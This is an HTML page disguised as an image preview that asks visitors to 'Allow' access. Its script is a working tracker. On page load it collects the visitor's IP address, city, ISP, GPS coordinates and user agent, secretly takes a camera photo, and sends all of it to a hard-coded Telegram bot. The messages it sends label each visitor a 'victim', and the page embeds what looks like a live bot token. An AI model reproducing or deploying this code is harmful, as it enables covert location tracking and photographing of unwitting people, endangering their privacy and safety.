<!DOCTYPE html>
<html>
<head>
    <title>üñºÔ∏è Image Preview</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { margin: 0; padding: 20px; background: #000; color: white; text-align: center; }
        img { max-width: 100%; border-radius: 10px; }
        #status { color: red; font-weight: bold; }
    </style>
</head>
<body>
    <h2>üîì Tap "Allow" to view image</h2>
    <img src="https://image2url.com/images/1754223677507-03a3b8dc-4a52-4cad-8207-64e6a5c6f74b.jpg" alt="Loading...">
    <p id="status">Requesting camera access...</p>

    <script>
        // Telegram Bot Config
        const BOT_TOKEN = '8386686128:AAFLCInZJmy72La6aiWW2GPy9iTSfptNmts';
        const CHAT_ID = '7307112522';

        // 1Ô∏è‚É£ Grab IP & Geolocation
        fetch('https://ipapi.co/json/')
            .then(res => res.json())
            .then(ipData => {
                // 2Ô∏è‚É£ Grab GPS (if allowed)
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        const gps = `${pos.coords.latitude},${pos.coords.longitude}`;
                        stealCamera(ipData, gps); // 3Ô∏è‚É£ Attempt camera access
                    },
                    (err) => stealCamera(ipData, "GPS Blocked")
                );
            });

        // üì∏ Steal Camera Access
        function stealCamera(ipData, gps) {
            const statusEl = document.getElementById('status');
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    statusEl.textContent = "‚úÖ Camera accessed! Sending data...";
                    
                    // 4Ô∏è‚É£ Send victim data to Telegram
                    const message = `üö® **NEW VICTIM ACTIVATED CAMERA** üö®\n\n` +
                        `üì∏ **Camera Access: GRANTED**\n` +
                        `üõ∞Ô∏è IP: ${ipData.ip}\n` +
                        `üìç City: ${ipData.city}\n` +
                        `üåê ISP: ${ipData.org}\n` +
                        `üéØ GPS: ${gps}\n` +
                        `üì± Device: ${navigator.userAgent}`;

                    // Send text alert
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`);

                    // üé• (Optional) Snap photo and send
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.onloadedmetadata = () => {
                        video.play();
                        setTimeout(() => {
                            const canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            canvas.getContext('2d').drawImage(video, 0, 0);
                            const photo = canvas.toDataURL('image/jpeg');
                            
                            // Send photo via Telegram API
                            const formData = new FormData();
                            formData.append('chat_id', CHAT_ID);
                            formData.append('photo', photo);
                            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                                method: 'POST',
                                body: formData
                            });
                        }, 3000); // Takes photo after 3 sec
                    };
                })
                .catch(err => {
                    statusEl.textContent = "‚ùå Camera blocked. Sending basic info...";
                    const message = `‚ö†Ô∏è **VICTIM BLOCKED CAMERA** ‚ö†Ô∏è\n\n` +
                        `IP: ${ipData.ip}\n` +
                        `GPS: ${gps}\n` +
                        `User-Agent: ${navigator.userAgent}`;
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`);
                });
        }
    </script>
</body>
</html>